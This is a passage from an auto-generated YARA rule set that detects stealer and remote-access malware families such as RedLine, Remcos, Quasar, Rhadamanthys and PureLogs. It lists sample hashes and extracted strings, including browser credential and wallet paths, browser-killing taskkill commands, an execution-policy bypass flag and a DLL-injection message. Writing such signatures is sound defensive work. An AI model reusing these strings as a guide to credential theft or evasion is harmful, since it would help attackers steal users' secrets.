      $s9 = ";|;t;l;d;\\;T;L;D;<;4;,;$;" fullword ascii /* reversed goodware string ';$;,;4;<;D;L;T;\\;d;l;t;|;' */ /* score: '11.00'*/
      $s10 = "<|<t<p<h<d<\\<X<P<L<D<@<8<4<,<(< <" fullword ascii /* reversed goodware string '< <(<,<4<8<@<D<L<P<X<\\<d<h<p<t<|<' */ /* score: '11.00'*/
      $s11 = "<|<t<l<d<\\<T<L<D<<<4<,<$<" fullword ascii /* reversed goodware string '<$<,<4<<<D<L<T<\\<d<l<t<|<' */ /* score: '11.00'*/
      $s12 = "=|=t=l=d=\\=T=L=D=<=4=,=$=" fullword ascii /* reversed goodware string '=$=,=4=<=D=L=T=\\=d=l=t=|=' */ /* score: '11.00'*/
      $s13 = "9t9p9l9h9d9`9\\9X9T9P9L9H9D9@9<9894909,9(9$9 9" fullword ascii /* reversed goodware string '9 9$9(9,9094989<9@9D9H9L9P9T9X9\\9`9d9h9l9p9t9' */ /* score: '11.00'*/
      $s14 = "=|=x=p=l=d=`=X=T=L=H=@=<=4=0=(=$=" fullword ascii /* reversed goodware string '=$=(=0=4=<=@=H=L=T=X=`=d=l=p=x=|=' */ /* score: '11.00'*/
      $s15 = "0?(? ?" fullword ascii /* reversed goodware string '? ?(?0' */ /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x6152 or uint16(0) == 0x534d ) and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__PureLogsStealer_signature__3d2219b4_PureLogsStealer_signature__8ad4bfcb_PureLogsStealer_signatur_36 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature).js, PureLogsStealer(signature)_3d2219b4.js, PureLogsStealer(signature)_8ad4bfcb.js, PureLogsStealer(signature)_8d5c5174.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "42467b6b16f9569d815ac613c907e5e0022cde94cfc9166be12db8e85d41951f"
      hash2 = "3d2219b4da7dd26dc124bef80c26ca0537ccab6b31d2dd4c859f51677b791807"
      hash3 = "8ad4bfcb82c9de962f5759ed8405db0840939e7bec0e4befdf07f917d3aef72e"
      hash4 = "8d5c5174da9250e12a307b78982ec318f94e9064312c36a72afe08607aff0f15"
   strings:
      $s1 = "iframe.src=\"javascript:\";" fullword ascii /* score: '25.00'*/
      $s2 = "var compliantExecNpcg=/()??/.exec(\"\")[1]===void 0;" fullword ascii /* score: '23.00'*/
      $s3 = "descriptor.get=getter;" fullword ascii /* score: '21.00'*/
      $s4 = "if(!compliantExecNpcg){" fullword ascii /* score: '19.00'*/
      $s5 = "if(!compliantExecNpcg&&match.length>1){" fullword ascii /* score: '19.00'*/
      $s6 = "Object.getOwnPropertyDescriptor=function(object,property){" fullword ascii /* score: '18.00'*/
      $s7 = "defineGetter(object,property,descriptor.get);" fullword ascii /* score: '18.00'*/
      $s8 = "var boundLength=Math.max(0,target.length-args.length);" fullword ascii /* score: '17.00'*/
      $s9 = "throw new TypeError(ERR_NON_OBJECT_TARGET+object);" fullword ascii /* score: '17.00'*/
      $s10 = "Empty.prototype=target.prototype;" fullword ascii /* score: '17.00'*/
      $s11 = "descriptor.set=setter;" fullword ascii /* score: '16.00'*/
      $s12 = "throw new TypeError(\"Function.prototype.bind called on incompatible \"+target);" fullword ascii /* score: '16.00'*/
      $s13 = "var match=isoDateExpression.exec(string);" fullword ascii /* score: '16.00'*/
      $s14 = "while(match=separator.exec(string)){" fullword ascii /* score: '16.00'*/
      $s15 = "if(getOwnPropertyDescriptorFallback){" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x2a2f or uint16(0) == 0x0a0d ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__b039c588c74493feceed91f3303659a5_imphash__Rhadamanthys_signature__87a63f644cb8a20014ebd30c4ceb01d5_imp_37 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_b039c588c74493feceed91f3303659a5(imphash).dll, Rhadamanthys(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fa0a17558cdffecb14f708aaab196af264cdb80f45b8a4cc5ad3f92cd3c4f78d"
      hash2 = "de9c07923c1e57c3c523277409a430939715f3508beba4436965c8146170df2b"
   strings:
      $s1 = "??0QMutex@@QAE@XZ" fullword ascii /* score: '15.00'*/
      $s2 = "??0QRecursiveMutex@@QAE@XZ" fullword ascii /* score: '15.00'*/
      $s3 = "??0QBasicMutex@@QAE@XZ" fullword ascii /* score: '15.00'*/
      $s4 = "??1QRecursiveMutex@@QAE@XZ" fullword ascii /* score: '15.00'*/
      $s5 = "?compare@QOperatingSystemVersion@@CAHABV1@0@Z" fullword ascii /* score: '14.00'*/
      $s6 = "?rename@QTemporaryFile@@QAE_NABVQString@@@Z" fullword ascii /* score: '11.00'*/
      $s7 = "?setReadChannelCount@QIODevicePrivate@@QAEXH@Z" fullword ascii /* score: '10.00'*/
      $s8 = "?invokeMethodImpl@QMetaObject@@CA_NPAVQObject@@PAVQSlotObjectBase@QtPrivate@@W4ConnectionType@Qt@@PAX@Z" fullword ascii /* score: '10.00'*/
      $s9 = "?qt_QMetaEnum_debugOperator@@YA?AVQDebug@@AAV1@HPBUQMetaObject@@PBD@Z" fullword ascii /* score: '9.00'*/
      $s10 = "Copyright (C) 2020 The Qt Company Ltd." fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_38 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089g" fullword ascii /* score: '27.00'*/
      $s2 = "HSystem.Collections.IComparer.Compare`System.Collections.IEqualityComparer.GetHashCodeVSystem.Collections.IEqualityComparer.Equa" ascii /* score: '25.00'*/
      $s3 = "HSystem.Collections.IComparer.Compare`System.Collections.IEqualityComparer.GetHashCodeVSystem.Collections.IEqualityComparer.Equa" ascii /* score: '25.00'*/
      $s4 = "SimpleBase.dll" fullword ascii /* score: '23.00'*/
      $s5 = "&GetFieldBypassCctor&SetFieldBypassCctor@" fullword ascii /* score: '20.00'*/
      $s6 = "\"UncheckedGetField\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
      $s7 = "HDateTimeOffsetTimeZonePostProcessing" fullword ascii /* score: '20.00'*/
      $s8 = "GetDateOfNNDS*ProcessDateTimeSuffix" fullword ascii /* score: '20.00'*/
      $s9 = "Sleep\"SetApartmentState2GetCurrentProcessorNumber" fullword ascii /* score: '20.00'*/
      $s10 = "\"get_ClockDateTime8System.IComparable.CompareTo" fullword ascii /* score: '19.00'*/
      $s11 = "(ConstrainedExecution\"ExceptionServices" fullword ascii /* score: '19.00'*/
      $s12 = "RemoveXSystem.Collections.IDictionary.GetEnumerator`System.Collections.IDictionaryEnumerator.get_KeydSystem.Collections.IDiction" ascii /* score: '18.00'*/
      $s13 = "RemoveXSystem.Collections.IDictionary.GetEnumerator`System.Collections.IDictionaryEnumerator.get_KeydSystem.Collections.IDiction" ascii /* score: '18.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Object>>.get_Current@" fullword ascii /* score: '18.00'*/
      $s15 = "PSystem.Collections.ICollection.get_CountBSystem.Collections.IList.get_Item8System.Collections.IList.Add" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_39 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
   strings:
      $s1 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType&TryGetMethodInvoker@" fullword ascii /* score: '18.00'*/
      $s2 = "ChangeType operation is not supported" fullword wide /* score: '17.00'*/
      $s3 = "`ReflectionExecutionDomainCallbacksImplementation MethodInvokeInfo" fullword ascii /* score: '16.00'*/
      $s4 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject$get_SafeWaitHandle@" fullword ascii /* score: '16.00'*/
      $s5 = " ExecutionContext" fullword ascii /* score: '16.00'*/
      $s6 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheckBMethodInvokerWithMethodInvokeInfo*InstanceMethodInvoker" fullword ascii /* score: '16.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<System.Reflection.EventInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s9 = "WIN32_FIND_DATA:TIME_DYNAMIC_ZONE_INFORMATION PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s10 = "System.Collections.Generic.IEnumerator<System.Reflection.PropertyInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<System.Reflection.CustomAttributeData>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerable<System.Reflection.EventInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<System.Reflection.PropertyInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5__40 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash3 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash4 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash5 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash6 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s2 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s3 = "os.executable" fullword ascii /* score: '16.00'*/
      $s4 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s5 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s6 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s7 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s8 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s9 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s10 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s11 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s13 = "debug/pe.readOptionalHeader" fullword ascii /* score: '12.00'*/
      $s14 = "os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s15 = "debug/pe.readOptionalHeader.func1" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2d59db9f_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_41 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash2 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash3 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash4 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
   strings:
      $x1 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '31.00'*/
      $x2 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '31.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<Quasar.Common.Models.FileChunk>.get_Current" fullword ascii /* score: '22.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.GetEnumerator" fullword ascii /* score: '22.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.get_Current" fullword ascii /* score: '22.00'*/
      $s6 = "=Client, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s7 = "Oprotobuf-net, Version=2.4.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67" fullword ascii /* score: '21.00'*/
      $s8 = "VBouncyCastle.Crypto, Version=1.9.0.0, Culture=neutral, PublicKeyToken=0e99375e54769942" fullword ascii /* score: '20.00'*/
      $s9 = "Opera Software\\Opera GX Stable\\Login Data" fullword wide /* score: '20.00'*/
      $s10 = "Opera Software\\Opera Stable\\Login Data" fullword wide /* score: '20.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.Current" fullword ascii /* score: '17.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<Quasar.Common.Models.FileChunk>.Current" fullword ascii /* score: '17.00'*/
      $s13 = "Gma.System.MouseKeyHook.Implementation" fullword ascii /* score: '17.00'*/
      $s14 = "Quasar.Common.Messages.ReverseProxy" fullword ascii /* score: '17.00'*/
      $s15 = "Gma.System.MouseKeyHook.HotKeys" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__844e4c46_RedLineStealer_signature__f34d5f2d4577ed6d9cee_42 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_844e4c46.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9fd0eaf7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "844e4c466954278d395f6e8a14f0dce60052f683ea921e147fc756abba4c82a5"
      hash2 = "9fd0eaf75124db45051e5c3b0561b3e8c80af9459fcddf09289698b4acc42096"
   strings:
      $x1 = "user.config{0}\\FileZilla\\sitemanager.xmlcookies.sqlite\\Program Files (x86)\\configRoninWalletdisplayNamehost_key\\Electrum\\w" wide /* score: '67.00'*/
      $x2 = "[^\\u0020-\\u007F]ProcessIdname_on_cardencrypted_valuehttps://ipinfo.io/ip%appdata%\\logins{0}\\FileZilla\\recentservers.xml%app" wide /* score: '39.00'*/
      $s3 = "Happy.exe" fullword ascii /* score: '22.00'*/
      $s4 = "egram.exe" fullword wide /* score: '22.00'*/
      $s5 = "Implosions.exe" fullword wide /* score: '22.00'*/
      $s6 = "get_TaskProcessors" fullword ascii /* score: '20.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<ScannedFile>.get_Current" fullword ascii /* score: '20.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<ScannedFile>.GetEnumerator" fullword ascii /* score: '20.00'*/
      $s9 = "*autofillexpiraas21tion_yas21earffnbelfdoeiohenkjibnmadjiehjhajbProfilesTotal of RAMhttps://api.ip.sb/geoip%USERPEnvironmentROFI" wide /* score: '20.00'*/
      $s10 = "<TaskProcessors>k__BackingField" fullword ascii /* score: '15.00'*/
      $s11 = "ITaskProcessor" fullword ascii /* score: '15.00'*/
      $s12 = "ListOfProcesses" fullword ascii /* score: '15.00'*/
      $s13 = "get_ScanGeckoBrowsersPaths" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<ScannedFile>.Current" fullword ascii /* score: '15.00'*/
      $s15 = "get_ScannedWallets" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__PureLogsStealer_signature__a44f87a7_PureLogsStealer_signature__d2136637_PureLogsStealer_signatur_43 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature).hta, PureLogsStealer(signature)_a44f87a7.hta, PureLogsStealer(signature)_d2136637.hta, PureLogsStealer(signature)_f389b163.hta, RemcosRAT(signature)_08d4c48e.hta, RemcosRAT(signature)_4e0a38b5.hta, RemcosRAT(signature)_880334a4.hta, RemcosRAT(signature)_9061c74a.hta, RemcosRAT(signature)_bdfcd291.hta, RemcosRAT(signature)_fe1db4d0.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eec1bb868eed6c6d6197757c48e114df1eee015edba06820d1147375abff9116"
      hash2 = "a44f87a7e95409b0403eb626bd0afdb304a583a9da98c9fb6338cbdfb988c2e5"
      hash3 = "d21366370d4f886c2d4c4f572a3730c3fb12656dd67e0ada8fd97f196c45369c"
      hash4 = "f389b163c6b3abd4c3dd92945f706f33c9a45e6b53fe3f9ca3620b6d43212d84"
      hash5 = "08d4c48eae51e99498f9c8d9e4f1a0592f50883ebd066d6905aee6d4c4dd7dfc"
      hash6 = "4e0a38b5cd2dc41a7932b7004b1edb2c779f12e008ce9c791053e2dfeac82f77"
      hash7 = "880334a4f36170bd8c34b574a919596fd3ba56f2a810310feba377f90dfe49af"
      hash8 = "9061c74abcc099b38c696f0d2738ad482f39b707cb943babaf20ff9e2f115054"
      hash9 = "bdfcd29146887e7d3896d1e463382f5ccce620e01a36d3c2d6641e21d9d2d9f2"
      hash10 = "fe1db4d0748048623affd15250801b749f8616b395c66258ba8ca685ffe5e0b7"
   strings:
      $s1 = "     *  Mode Of Operation - Counter (CTR)" fullword ascii /* score: '14.00'*/
      $s2 = "     *  Mode Of Operation - Electonic Codebook (ECB)" fullword ascii /* score: '14.00'*/
      $s3 = "     *  Counter object for CTR common mode of operation" fullword ascii /* score: '13.00'*/
      $s4 = "     *  Mode Of Operation - Output Feedback (OFB)" fullword ascii /* score: '12.00'*/
      $s5 = "     *  Mode Of Operation - Cipher Feedback (CFB)" fullword ascii /* score: '12.00'*/
      $s6 = "     *  Mode Of Operation - Cipher Block Chaining (CBC)" fullword ascii /* score: '12.00'*/
      $s7 = "            copyBuffer(encrypted, this._shiftRegister, 16 - this.segmentSize, i, i + this.segmentSize);" fullword ascii /* score: '12.00'*/
      $s8 = "    ModeOfOperationOFB.prototype.decrypt = ModeOfOperationOFB.prototype.encrypt;" fullword ascii /* score: '11.00'*/
      $s9 = "    ModeOfOperationCTR.prototype.decrypt = ModeOfOperationCTR.prototype.encrypt;" fullword ascii /* score: '11.00'*/
      $s10 = "            if (targetStart == null) { targetStart = 0; }" fullword ascii /* score: '9.00'*/
      $s11 = "                targetBuffer[targetStart++] = sourceBuffer[i];" fullword ascii /* score: '9.00'*/
      $s12 = "            sourceBuffer.copy(targetBuffer, targetStart, sourceStart, sourceEnd);" fullword ascii /* score: '9.00'*/
      $s13 = "        copyBuffer = function(sourceBuffer, targetBuffer, targetStart, sourceStart, sourceEnd) {" fullword ascii /* score: '9.00'*/
      $s14 = "                encrypted[i + j] ^= xorSegment[j];" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x683c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111__44 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash2 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s2 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '22.00'*/
      $s3 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s4 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s5 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s6 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s7 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s8 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s9 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s10 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s11 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s12 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s13 = "RegQueryInfoKeyWRegQueryValueExWRemoveDirectoryWSetFilePointerExTerminateProcessZanabazar_Square" fullword ascii /* score: '15.00'*/
      $s14 = "allocSpan" fullword ascii /* base64 encoded string 'jYhq*Z' */ /* score: '14.00'*/
      $s15 = "runtime.offAddr.sub" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__907526c3_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_45 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash2 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash3 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash4 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $x1 = "cmd.exe /c start %TARGETOSDRIVE%\\Recovery\\OEM\\" fullword wide /* score: '53.00'*/
      $x2 = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F" fullword wide /* score: '52.00'*/
      $x3 = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F" fullword wide /* score: '52.00'*/
      $x4 = "Conhost --headless cmd.exe /c taskkill /IM " fullword wide /* score: '47.00'*/
      $x5 = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F" fullword wide /* score: '47.00'*/
      $x6 = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F" fullword wide /* score: '47.00'*/
      $x7 = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F" fullword wide /* score: '47.00'*/
      $x8 = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F" fullword wide /* score: '47.00'*/
      $x9 = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F" fullword wide /* score: '47.00'*/
      $x10 = "Conhost --headless cmd.exe /c start firefox --profile=\"" fullword wide /* score: '46.00'*/
      $x11 = "Conhost --headless cmd.exe /c start \"\" \"" fullword wide /* score: '46.00'*/
      $x12 = "conhost cmd.exe" fullword wide /* score: '38.00'*/
      $x13 = "Failed to write DLL path to target process memory" fullword wide /* score: '33.00'*/
      $x14 = "-ExecutionPolicy Bypass -File " fullword wide /* score: '31.00'*/
      $s15 = "\" --processStart Discord.exe" fullword wide /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111__46 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash2 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash3 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash4 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash5 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash6 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
